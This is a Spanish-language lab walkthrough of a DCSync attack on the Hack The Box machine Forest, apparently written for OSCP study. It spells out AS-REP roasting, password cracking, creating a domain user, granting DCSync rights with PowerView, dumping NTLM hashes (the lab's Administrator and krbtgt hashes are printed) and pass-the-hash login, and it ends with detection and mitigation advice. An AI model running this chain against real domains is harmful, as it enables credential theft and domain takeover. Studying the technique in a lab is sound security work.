### ¿Qué es DCSync?

DCSync es una técnica que permite a un atacante simular el comportamiento de un Controlador de Dominio (DC) para sincronizar y replicar datos, incluyendo hashes de contraseñas de cuentas de dominio.

### Mecanismo del Ataque

1. **Replicación de Directorio**: Los DCs usan protocolos como DRSUAPI para sincronizar la base de datos NTDS.dit
    
2. **Privilegios Requeridos**: Se necesitan los permisos `Replicating Directory Changes` y `Replicating Directory Changes All`
    
3. **Extracción de Hashes**: Permite dumpear todos los hashes NTLM del dominio
    

## Flujo del Ataque en Forest

### 1. Foothold Inicial - ASREPRoasting

bash

# Enumeración de usuarios con pre-autenticación Kerberos deshabilitada
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass

# Crackeo del hash TGT
john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt

**Resultado**: Credenciales `svc-alfresco:s3rvice`

### 2. Acceso Inicial via WinRM

bash

evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

### 3. Escalada de Privilegios - Análisis con Bloodhound

- **svc-alfresco** es miembro del grupo **Account Operators**
    
- **Account Operators** puede añadir usuarios a grupos no protegidos
    
- **Exchange Windows Permissions** tiene **WriteDacl** sobre el dominio
    

### 4. Preparación para DCSync

#### Crear usuario malicioso

powershell

net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add

#### Otorgar privilegios DCSync usando PowerView

powershell

# Cargar PowerView
. .\PowerView.ps1

# Crear credenciales
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)

# Otorgar derechos DCSync
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

### 5. Ejecución del Ataque DCSync

bash

impacket-secretsdump htb/john@10.10.10.161

**Output crítico**:

text

htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::

### 6. Acceso como Administrador

bash

impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

## Conceptos Clave para OSCP

### Permisos Requeridos para DCSync

- `DS-Replication-Get-Changes`
    
- `DS-Replication-Get-Changes-All`
    
- `DS-Replication-Get-Changes-In-Filtered-Set`
    

### Grupos que normalmente tienen estos permisos

- Administrators
    
- Domain Admins
    
- Enterprise Admins
    
- Exchange Windows Permissions (en entornos Exchange)
    

### Detección y Mitigación

- **Monitoreo**: Eventos 4662 en logs de Windows para replicación no autorizada
    
- **Principio de Mínimo Privilegio**: Revisar membresías de grupos privilegiados
    
- **Hardening**: Remover permisos innecesarios de grupos como Exchange Windows Permissions
    

### Herramientas Alternativas

- **Mimikatz**: `lsadump::dcsync`
    
- **SharpKatz**: Implementación en C# de Mimikatz
    
- **DSInternals**: Para análisis forense de AD
    

Este ataque demuestra la importancia de la segregación de privilegios y el monitoreo de cambios en ACLs en entornos Active Directory.